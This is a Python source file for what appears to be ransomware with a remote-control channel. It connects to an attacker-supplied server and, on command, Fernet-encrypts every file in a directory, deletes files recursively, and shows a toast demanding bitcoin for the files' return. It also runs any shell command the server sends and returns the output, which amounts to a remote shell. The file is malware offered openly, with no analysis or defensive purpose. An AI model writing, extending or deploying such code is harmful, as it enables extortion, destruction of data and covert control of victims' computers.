import os
from os import walk
from cryptography.fernet import Fernet
import socket
from plyer import notification
from win11toast import toast
import subprocess

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host= " "  #enter ip address
port= 8573

s.connect((host, port))

def encdata(dir_path,sm):


    allfiles = []
  
    os.chdir(dir_path) 

    for file in os.listdir():
        if file == "key.key":
            continue
        if os.path.isfile(file):
            allfiles.append(file)
               
    print(allfiles)
    key = Fernet.generate_key()

    with open("key.key", "wb") as thekey:
        thekey.write(key)
            
    for file in allfiles:
        with open(str(file), "rb") as thefile: 
            content = thefile.read()
        contentencr = Fernet(key).encrypt(content)
        with open(str(file), "wb") as thefile:
            thefile.write(contentencr)
    c_messg ="All youy files has been encrypted"
    s.send(c_messg.encode("utf-8"))

def desdata(dir_path,sm):
    allfiles = []
 
    os.chdir(dir_path)
    for file in os.listdir():
        if file == "key.key":
            continue
        if os.path.isfile(file):
            allfiles.append(file)
       
    print(allfiles)

    with open("key.key", "rb") as key:
        password = key.read()
   
    for file in allfiles:
        with open(str(file), "rb") as thefile:
            contents = thefile.read()
        contentdecr = Fernet(password).decrypt(contents)
        with open(str(file), "wb") as thefile:
            thefile.write(contentdecr) 
    c_messg = "You got your files back"
    s.send(c_messg.encode("utf-8"))
 

def disconnect(dir_path,sm):
    c_messg = "Disconnected from server....."
    s.send(c_messg.encode("utf-8"))



def filedelete(dir_path,sm):
    os.chdir(dir_path)
    try:
        for root,dirs,files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root,file)
                os.remove(file_path)
            # os.rmdir(dirs)
          
        c_messg = "All files and subdirections deleted..."
        s.send(c_messg.encode("utf-8"))
    except OSError:
        c_messg = "Error Occuredd...Fail...Try..Again.."
        s.send(c_messg.encode("utf-8"))




while True:
    
    #ecn
    print("wating for response")
    s_messg = s.recv(1024)
    messg = s_messg.decode("utf-8")
    path= messg.split(",")
    dir_path = path[0]
    sm = path[1]
    print(dir_path)
    # break
    if sm == "encrypt":
        encdata(dir_path,sm)

   
    if sm == "decrypt":
     
        print(dir_path) 
        desdata(dir_path,sm)
    
    if sm == "disconnect":
        disconnect(dir_path,sm)
        s.close()
        break

    if sm == "delete":
        filedelete(dir_path,sm)
    
    if sm == "noti":
        toast("All of your files have been encrypted.","If you want to get your files back, send 50 thousand bitcoins to ddbank and contact at ano@gmail.com")
        c_messg = "Successful notification messages.."
        s.send(c_messg.encode("utf-8"))
       
   
    if dir_path == "command":
        
        if sm == "exit":
            disconnect(dir_path,sm)
            s.close()
            break
        print("Get it")

        CMD = subprocess.run(sm, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        s.send(CMD.stdout)
